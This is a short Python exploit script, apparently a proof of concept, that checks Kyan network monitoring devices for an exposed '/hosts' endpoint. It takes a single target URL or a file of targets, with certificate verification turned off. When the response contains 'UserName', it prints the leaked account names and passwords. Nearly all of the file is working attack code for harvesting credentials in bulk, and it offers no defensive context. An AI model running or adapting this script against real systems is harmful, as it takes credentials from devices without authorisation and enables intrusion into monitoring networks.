#!/usr/bin/env python
# -*- conding:utf-8 -*-

import argparse
import requests
import sys
import urllib3
urllib3.disable_warnings()

def title():
    def title():
        print("""
                               Kyan 网络监控敏感信息泄漏
                            use: python3  Kyaninformation.py
                                 Author: Henry4E36
        """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        target_url = self.url + "/hosts"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }
        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
            if "UserName" in res.text and res.status_code == 200:
                print(f"\033[31m[{chr(8730)}]  目标系统: {self.url} 存在敏感信息泄漏！")
                print(f"[-]  账号密码为: \n{res.text}")
            else:
                print("[\033[31mx\033[0m]  目标系统: {url} 不存在敏感信息泄漏！")
        except Exception as e:
            print("[\033[31mx\033[0m]  站点连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="Kyan 网络监控 Options")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 Kyaninformation.py -u http://127.0.0.1\neg2:>>>python3 Kyaninformation.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()


